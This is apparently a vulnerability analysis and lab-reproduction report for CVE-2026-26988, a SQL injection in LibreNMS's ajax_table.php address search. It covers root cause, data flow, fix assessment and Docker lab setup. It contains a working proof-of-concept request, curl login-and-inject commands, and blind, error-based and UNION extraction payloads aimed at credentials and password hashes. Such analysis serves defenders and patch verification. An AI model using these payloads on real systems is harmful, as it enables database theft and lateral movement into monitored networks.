# Vulnerability Analysis: CVE-2026-26988

## Executive Summary

CVE-2026-26988 is a **SQL Injection** vulnerability in LibreNMS ≤25.12.0 in the `ajax_table.php` endpoint when processing IPv4/IPv6 address search requests. The application fails to parameterize the CIDR prefix portion of the `address` parameter, allowing authenticated attackers to inject arbitrary SQL via string concatenation into the `WHERE` clause. The fix is **complete** — it deletes the vulnerable file entirely and replaces it with parameterized Laravel Eloquent controllers.

---

## Root Cause

**Missing parameterization of user input in raw SQL string concatenation.**

The `address` parameter from `$_POST` is split on `/` into an address portion and a prefix portion (line 20-22 of `includes/html/table/address-search.inc.php`). While the address portion is properly bound via `?` placeholders, the **prefix** portion is directly interpolated into the SQL query string inside single quotes:

```php
// Line 34 (IPv4 path):
$sql .= " AND ipv4_prefixlen='$prefix'";

// Line 52 (IPv6 path):
$sql .= " AND ipv6_prefixlen = '$prefix'";
```

A single quote in the prefix breaks out of the string literal, allowing arbitrary SQL injection.

### Why POST Input is Unescaped

The `$vars` array is populated from `includes/html/vars.inc.php`:

```php
// GET values — sanitized with strip_tags():
foreach ($_GET as $name => $value) {
    $vars[$name] = strip_tags((string) $value);
}

// POST values — NO sanitization:
foreach ($_POST as $name => $value) {
    $vars[$name] = $value;
}
```

POST values pass through completely unsanitized, making POST the preferred injection vector.

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerable File

**File:** `includes/html/table/address-search.inc.php`

| Line | Code | Injection Type |
|------|------|---------------|
| **34** | `$sql .= " AND ipv4_prefixlen='$prefix'";` | IPv4 prefix SQLi |
| **52** | `$sql .= " AND ipv6_prefixlen = '$prefix'";` | IPv6 prefix SQLi |

### Entry Point

**File:** `html/ajax_table.php`

- **Line 20-22**: Auth check (`Auth::check()`) — returns "Unauthorized" if no valid session
- **Line 40**: `$id = basename((string) $_REQUEST['id']);` → resolves to `address-search`
- **Line 43-45**: Includes the vulnerable file: `include_once "includes/html/table/$id.inc.php";`

### Data Flow

```
HTTP POST /ajax_table.php
  ↓
$_POST['address'] = "2001:db8::1/64' OR SLEEP(5)-- -"
  ↓
includes/html/vars.inc.php (line 9-11): $vars['address'] = $_POST['address']  (NO sanitization)
  ↓
address-search.inc.php (line 20-22): explode('/', $address, 2)
  → $address = "2001:db8::1"
  → $prefix  = "64' OR SLEEP(5)-- -"
  ↓
Line 52: $sql .= " AND ipv6_prefixlen = '64' OR SLEEP(5)-- -'"
  ↓
dbFetchCell() / dbFetchRows() execute the injected SQL against MySQL/MariaDB
```

---

## Triggering Input

### Minimum PoC Request

```http
POST /ajax_table.php HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session_cookie>

id=address-search&search_type=ipv6&address=::1/1' OR SLEEP(5)-- -&current=1&rowCount=10
```

### Payload Breakdown

| Component | Value | Purpose |
|-----------|-------|---------|
| `id` | `address-search` | Selects the vulnerable include file |
| `search_type` | `ipv6` (or `ipv4`) | Selects the code branch with the injection |
| `address` | `::1/1' OR SLEEP(5)-- -` | `::1` = dummy IPv6, `/` = separator, `1'` = closes the string literal, `OR SLEEP(5)` = injected SQL, `-- -` = comment out trailing quote |
| `current` | `1` | Pagination param (required for query) |
| `rowCount` | `10` | Pagination param (required for query) |

### Both Injection Paths

**IPv6 path** (`search_type=ipv6`):
- Payload: `address=::1/64' OR SLEEP(5)-- -`
- Generated SQL: `... AND ipv6_prefixlen = '64' OR SLEEP(5)-- -'`

**IPv4 path** (`search_type=ipv4`):
- Payload: `address=10.0.0.1/24' OR SLEEP(5)-- -`
- Generated SQL: `... AND ipv4_prefixlen='24' OR SLEEP(5)-- -'`

### Note on SLEEP Behavior

The `SLEEP()` fires **per-row** in both the `COUNT(*)` query (line 85) and the `SELECT *` query (line 107). If the database has N matching rows (in `ipv6_addresses` or `ipv4_addresses`), the total delay is approximately `SLEEP_VALUE × N × 2` (once for COUNT, once for SELECT). Even with 0 matching rows, the `OR SLEEP(5)` can still fire because it's evaluated as part of the WHERE clause condition evaluation.

### MAC Path (NOT Vulnerable)

The `search_type=mac` code path (lines 59-65) does NOT have this vulnerability — it only uses `$vars['address']` via a `LIKE ?` parameterized query with no prefix splitting.

---

## Attack Scenario

### Step-by-Step Exploitation

1. **Prerequisites**: Attacker has a valid LibreNMS user account (any privilege level — read-only is sufficient)
2. **Authenticate**: POST to `/login` with valid credentials to obtain a session cookie
3. **Inject**: Send crafted POST to `/ajax_table.php` with the SQLi payload in the `address` parameter's prefix portion
4. **Exfiltrate**: Use time-based blind, boolean-based blind, or error-based techniques to extract database contents:
   - **Time-based blind**: `1' OR IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)-- -`
   - **Boolean-based blind**: `1' OR 1=1-- -` vs `1' OR 1=2-- -` (compare response content)
   - **Error-based** (if errors displayed): `1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -`
   - **UNION-based**: `1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,user()-- -` (requires matching column count)

### Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full read access to the MySQL/MariaDB database — SNMP community strings, device credentials, user password hashes, API tokens, network topology |
| **Integrity** | Write access via `INSERT`/`UPDATE` through stacked queries (if supported by the DB driver) or via `INTO OUTFILE` |
| **Availability** | Denial of service via `SLEEP()`, heavy queries, or `DROP TABLE` |
| **Lateral Movement** | Extracted SNMP credentials and device login credentials can be used to pivot into the monitored network infrastructure |

---

## Authentication Requirements

### Authentication Flow

1. **LibreNMS requires authentication** — `ajax_table.php` line 20: `if (! Auth::check()) { exit('Unauthorized'); }`
2. **Session-based auth** — Laravel session cookie (typically named `librenms_session` or `laravel_session`)
3. **No CSRF token required** — `ajax_table.php` is a legacy PHP file served directly by nginx/php-fpm, NOT routed through Laravel's middleware stack. It bypasses CSRF validation entirely.
4. **Any privilege level suffices** — even read-only users can trigger the SQLi. The only additional restriction is the `hasGlobalRead()` check on line 9, which limits the device scope for non-admin users, but the injection still fires.

### How to Authenticate for PoC

```bash
# Step 1: Get CSRF token and session cookie from login page
curl -c cookies.txt -s http://target/login | grep '_token'

# Step 2: POST login credentials
curl -b cookies.txt -c cookies.txt -L \
  -d '_token=<csrf_token>&username=admin&password=<password>' \
  http://target/login

# Step 3: Use the session cookie for the SQLi request
curl -b cookies.txt \
  -d 'id=address-search&search_type=ipv6&address=::1/1'"'"' OR SLEEP(5)-- -&current=1&rowCount=10' \
  http://target/ajax_table.php
```

### Default Credentials

The Docker image (`librenms/librenms:25.12.0`) requires initial setup. The first user is created via:
- Environment variable: `LIBRENMS_ADMIN_USER` / `LIBRENMS_ADMIN_PASSWORD` (Docker setup)
- OR via web installer at `/install`
- OR via CLI: `php artisan librenms:create-admin --username admin --password admin`

For lab setup, use: **admin / admin** (or whatever is configured in docker-compose.yml)

---

## Fix Assessment

### Fix Approach

The fix (commit `15429580baba03ed1dd377bada1bde4b7a1175a1`) takes a **complete rewrite approach**:

1. **Deletes** `includes/html/table/address-search.inc.php` entirely
2. **Creates** three new Laravel Eloquent controllers:
   - `app/Http/Controllers/Table/Ipv4AddressSearchController.php`
   - `app/Http/Controllers/Table/Ipv6AddressSearchController.php`
   - `app/Http/Controllers/Table/MacSearchController.php`
3. **Adds** new Laravel routes at `/table/address-search/ipv4`, `/table/address-search/ipv6`, `/table/address-search/mac`
4. **Updates** frontend pages (`ipv4.inc.php`, `ipv6.inc.php`, `mac.inc.php`) to use new route URLs

### Parameterization in the Fix

The CIDR prefix is now handled via Eloquent's parameterized `where()`:

```php
// In AddressSearchController::applyBaseSearchQuery():
if (isset($cidr)) {
    $q->where($this->cidrField, $cidr);
}
```

This generates `WHERE ipv6_prefixlen = ?` with `$cidr` as a bound parameter — fully safe.

### Fix Completeness: **COMPLETE**

| Check | Result |
|-------|--------|
| Vulnerable file deleted | ✅ Yes — `address-search.inc.php` removed |
| Replacement uses parameterized queries | ✅ Yes — Eloquent ORM with bound parameters |
| Both IPv4 and IPv6 paths fixed | ✅ Yes — separate controller for each |
| New routes go through Laravel middleware | ✅ Yes — auth + CSRF protection |
| Frontend updated to use new endpoints | ✅ Yes — `url: "<?php echo route('search.ipv4'); ?>"` |
| Old endpoint still accessible? | ✅ No — `ajax_table.php` file-inclusion check `file_exists("includes/html/table/address-search.inc.php")` returns false |
| Root cause addressed | ✅ Yes — string concatenation replaced with parameterized queries |
| Alternative encodings bypassed? | N/A — old file is deleted, no partial fix to bypass |

The fix is thorough and addresses the root cause. No bypass is possible because the vulnerable file no longer exists in patched versions.

---

## Related Attack Surface

### Other Table Include Files Using Raw SQL

The `ajax_table.php` dispatcher includes other `.inc.php` files from `includes/html/table/`. Several use raw SQL concatenation with `$sort`, `$limit_low`, `$limit_high`, and `$where` variables, but these are sanitized:

- `$sort` — column names are regex-filtered to `[A-Za-z0-9_]`, direction forced to ASC/DESC in `ajax_table.php` lines 31-37
- `$limit_low`, `$limit_high` — derived from `$current` and `$rowCount` which are cast to integer via `settype($current, 'integer')` in `ajax_table.php` lines 26-29
- `$where` — built from `dbGenPlaceholders()` which creates `?` placeholders

### alerts.inc.php — Potential Concern (Not Directly Exploitable for This CVE)

`includes/html/table/alerts.inc.php` line 42:
```php
$where .= ' AND `alerts`.`device_id`=' . $vars['device_id'];
```

While `$vars['device_id']` is concatenated directly, it's guarded by `is_numeric($vars['device_id'])` on line 41. PHP's `is_numeric()` returns true for valid integer/float strings, including hex (`0x1A`) and scientific notation (`1e5`), but these won't escape the numeric context in SQL. This is not directly exploitable but is poor practice.

### poll-log.inc.php — Safe

Line 31-32: `$overdue = (int) (LibrenmsConfig::get('rrd.step', 300) * 1.2);` — explicitly cast to `(int)`, not from user input. Safe.

### Summary: No additional files share the exact same vulnerability pattern (unparameterized user input in SQL WHERE clause). The `$prefix` injection in `address-search.inc.php` is unique to that file.

---

## Build System & Lab Requirements

### Build System

| Field | Value |
|-------|-------|
| **Type** | PHP application (no compilation needed) |
| **Package Manager** | Composer (PHP) + npm (frontend assets) |
| **Framework** | Laravel (via `laravel/framework` Composer package) |
| **PHP Version** | ≥8.2 |

### Recommended Lab Approach: Docker Image

**Do NOT build from source.** Use the official Docker image:

```
librenms/librenms:25.12.0
```

### Required Services

| Service | Image | Purpose |
|---------|-------|---------|
| LibreNMS | `librenms/librenms:25.12.0` | Vulnerable application |
| MariaDB | `mariadb:10.11` | Database backend |
| Redis | `redis:7-alpine` | Session/cache (optional but recommended) |

### Key Docker Environment Variables

```yaml
# LibreNMS container
MEMORY_LIMIT: "256M"
UPLOAD_MAX_SIZE: "16M"
OPCACHE_MEM_SIZE: "128"
REAL_IP_FROM: "0.0.0.0/0"
REAL_IP_HEADER: "X-Forwarded-For"
DB_HOST: "db"
DB_PORT: "3306"
DB_NAME: "librenms"
DB_USER: "librenms"
DB_PASSWORD: "librenms"
DB_TIMEOUT: "60"
# Admin user setup
LIBRENMS_ADMIN_USER: "admin"
LIBRENMS_ADMIN_PASSWORD: "admin"

# MariaDB container
MYSQL_ROOT_PASSWORD: "librenms"
MYSQL_DATABASE: "librenms"
MYSQL_USER: "librenms"
MYSQL_PASSWORD: "librenms"
```

### Network Setup

- LibreNMS web interface: port **8000** (mapped from container port 8000)
- MariaDB: port **3306** (internal only, no external exposure needed)
- No special network config required — the PoC targets the web interface directly

### Runtime Dependencies

- MariaDB must be up and initialized before LibreNMS starts
- LibreNMS needs ~30-60 seconds for initial database migration
- The database should have at least one entry in `ipv6_addresses` table for `SLEEP()` to fire per-row (but injection works even with empty tables)
- An admin user must exist to obtain a session cookie

### Build Commands (if building from source — NOT recommended)

```bash
cd librenms-source
composer install --no-dev
npm ci
npm run production
```

Required PHP extensions: `ext-curl, ext-gd, ext-json, ext-mbstring, ext-pcre, ext-pdo, ext-session, ext-simplexml, ext-sockets, ext-xml, ext-zlib`

---

## PoC Strategy Summary

### Recommended Approach: Time-Based Blind SQLi

1. Deploy LibreNMS 25.12.0 via Docker Compose
2. Wait for initialization (database migrations, admin user creation)
3. Authenticate via POST to `/login` to obtain session cookie
4. Send SQLi payload via POST to `/ajax_table.php`:
   - `id=address-search`
   - `search_type=ipv6` (or `ipv4`)
   - `address=::1/1' OR SLEEP(5)-- -`
   - `current=1`
   - `rowCount=10`
5. Measure response time — delay ≥5s confirms injection
6. Send same request to patched version (26.2.0) — immediate response confirms fix

### Verification Payloads

| Test | Payload (prefix portion) | Expected Result |
|------|--------------------------|-----------------|
| Syntax error | `64'-- -` | HTTP 500 or SQL error in response |
| Time-based | `1' OR SLEEP(5)-- -` | ~5+ second response delay |
| Boolean true | `64' OR 1=1-- -` | Returns all rows (total > 0) |
| Boolean false | `64' OR 1=2-- -` | Returns fewer/no rows |
| Version extraction | `1' OR IF(SUBSTRING(@@version,1,1)='1',SLEEP(5),0)-- -` | Conditional delay |
